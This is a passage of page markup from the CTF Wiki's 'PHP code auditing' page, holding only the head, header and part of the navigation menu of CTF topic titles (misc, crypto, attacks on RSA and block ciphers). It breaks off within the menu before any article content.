



<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../..">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
    
    
      
        <title>PHP code auditing - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.4031d38b.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.224b79ff.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#_1" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              CTF Wiki
            </span>
            <span class="md-header-nav__topic">
              
                PHP code auditing
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../.." title="Introduction" class="md-tabs__link">
          Introduction
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../misc/introduction-zh/" title="Misc" class="md-tabs__link">
          Misc
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../crypto/introduction-zh/" title="Crypto" class="md-tabs__link">
          Crypto
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../introduction-zh/" title="Web" class="md-tabs__link md-tabs__link--active">
          Web
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../assembly/x86-x64/readme-zh/" title="Assembly" class="md-tabs__link">
          Assembly
        </a>
      
    </li>
  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../executable/elf/elf-structure-zh/" title="Executable" class="md-tabs__link">
          Executable
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../reverse/introduction-zh/" title="Reverse" class="md-tabs__link">
          Reverse
        </a>
      
    </li>
  

  

      
        
  
  
    
    
  
  
    <li class="md-tabs__item">
      
        <a href="../../../pwn/readme-zh/" title="Pwn" class="md-tabs__link">
          Pwn
        </a>
      
    </li>
  

  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../android/basic_develop/basic_develop-zh/" title="Android" class="md-tabs__link">
          Android
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../ics/ctfs-zh/" title="ICS" class="md-tabs__link">
          ICS
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../.." title="Getting Started" class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../introduction/history-zh/" title="CTF History" class="md-nav__link">
      CTF History
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../introduction/mode-zh/" title="Introduction to CTF Competition Mode" class="md-nav__link">
      Introduction to CTF Competition Mode
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../introduction/content-zh/" title="CTF Contest content" class="md-nav__link">
      CTF Contest content
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../introduction/experience-zh/" title="Offline attack and defense experience summary" class="md-nav__link">
      Offline attack and defense experience summary
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../introduction/cgc-zh/" title="CGC Super Challenge" class="md-nav__link">
      CGC Super Challenge
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../introduction/resources-zh/" title="Learning resources" class="md-nav__link">
      Learning resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/introduction-zh/" title="Miscellaneous introduction" class="md-nav__link">
      Miscellaneous introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/recon-zh/" title="Information gathering technology" class="md-nav__link">
      Information gathering technology
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Code analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        Code analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/encode/communication-zh/" title="Commonly used coding in the communication field" class="md-nav__link">
      Commonly used coding in the communication field
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/encode/computer-zh/" title="Computer related code" class="md-nav__link">
      Computer related code
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/encode/modern-zh/" title="Commonly used encodings in the real world" class="md-nav__link">
      Commonly used encodings in the real world
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/prefix-zh/" title="Forensic steganography" class="md-nav__link">
      Forensic steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Image analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        Image analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/picture/introduction-zh/" title="Introduction to image analysis" class="md-nav__link">
      Introduction to image analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/picture/png-zh/" title="PNG" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/picture/jpg-zh/" title="JPG" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/picture/gif-zh/" title="GIF" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      Traffic packet analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        Traffic packet analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/introduction-zh/" title="Introduction to traffic packet analysis" class="md-nav__link">
      Introduction to traffic packet analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/fix-zh/" title="PCAP file repair" class="md-nav__link">
      PCAP file repair
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      Protocol analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        Protocol analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/README-zh/" title="Overview of protocol analysis" class="md-nav__link">
      Overview of protocol analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/Wireshark-zh/" title="Wireshark" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/HTTP-zh/" title="HTTP" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/HTTPS-zh/" title="HTTPS" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/FTP-zh/" title="FTP" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/DNS-zh/" title="DNS" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/WIFI-zh/" title="WIFI" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/protocols/USB-zh/" title="USB" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/traffic/data-zh/" title="Data extraction" class="md-nav__link">
      Data extraction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      Compressed package analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        Compressed package analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/archive/zip-zh/" title="ZIP format" class="md-nav__link">
      ZIP format
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/archive/rar-zh/" title="RAR format" class="md-nav__link">
      RAR format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/audio/introduction-zh/" title="Audio steganography" class="md-nav__link">
      Audio steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      Disk memory analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        Disk memory analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/disk-memory/introduction-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/disk-memory/problem-zh/" title="Title" class="md-nav__link">
      Title
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../misc/other/pyc-zh/" title="pyc file" class="md-nav__link">
      pyc file
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/introduction-zh/" title="Introduction to cryptography" class="md-nav__link">
      Introduction to cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      Basic mathematics knowledge
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        Basic mathematics knowledge
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/basic/introduction-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Classical password
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        Classical password
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/classical/introduction-zh/" title="Introduction to classical passwords" class="md-nav__link">
      Introduction to classical passwords
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/classical/monoalphabetic-zh/" title="Single table substitution encryption" class="md-nav__link">
      Single table substitution encryption
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/classical/polyalphabetic-zh/" title="Multi-table substitution encryption" class="md-nav__link">
      Multi-table substitution encryption
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/classical/others-zh/" title="Other types of encryption" class="md-nav__link">
      Other types of encryption
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/classical/summary-zh/" title="Summary" class="md-nav__link">
      Summary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Stream password
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        Stream password
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      Pseudo random number generator
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        Pseudo random number generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/prng/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/prng/csprng-zh/" title="Cryptographic security pseudo-random number generator" class="md-nav__link">
      Cryptographic security pseudo-random number generator
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/prng/problem-zh/" title="Problem" class="md-nav__link">
      Problem
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      Linear Congruence Generator
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        Linear Congruence Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/lcg/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/lcg/challenge-zh/" title="Example" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      Feedback Shift Register
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        Feedback Shift Register
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/fsr/intro-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/fsr/lfsr-zh/" title="Linear feedback shift register" class="md-nav__link">
      Linear feedback shift register
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/fsr/nfsr-zh/" title="Nonlinear feedback shift register" class="md-nav__link">
      Nonlinear feedback shift register
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      Special stream password
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        Special stream password
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/streamcipher/special/rc4-zh/" title="RC4" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Block encryption
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        Block encryption
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/introduction-zh/" title="Introduction to block encryption" class="md-nav__link">
      Introduction to block encryption
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/arx-operations-zh/" title="ARX" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto / blockcipher / des-zh.md" title="DES" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/idea-zh/" title="IDEA" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/aes-zh/" title="AES" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/simon-speck-zh/" title="Simon and Speck" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      Group mode
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        Group mode
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/introduction-zh/" title="Introduction" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/padding-zh/" title="Filling method" class="md-nav__link">
      Filling method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/ecb-zh/" title="ECB" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/cbc-zh/" title="CBC" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/pcbc-zh/" title="PCBC" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/cfb-zh/" title="CFB" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto / blockcipher / mode / ofb-zh.md" title="OFB" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/ctr-zh/" title="CTR" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/blockcipher/mode/padding-oracle-attack-zh/" title="Padding Oracle Attack" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-8" type="checkbox" id="nav-3-5-8">
    
    <label class="md-nav__link" for="nav-3-5-8">
      Asymmetric encryption
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-8">
        Asymmetric encryption
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/introduction-zh/" title="Introduction to asymmetric encryption" class="md-nav__link">
      Introduction to asymmetric encryption
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5-8-2" type="checkbox" id="nav-3-5-8-2">
    
    <label class="md-nav__link" for="nav-3-5-8-2">
      RSA
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-3-5-8-2">
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_theory-zh/" title="RSA Basic introduction" class="md-nav__link">
      RSA Basic introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_module_attack-zh/" title="Modulo-related attacks" class="md-nav__link">
      Modulo-related attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../crypto/asymmetric/rsa/rsa_e_attack-zh/" title="Public key index related attacks" class="md-nav__link">
      Public key index related attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
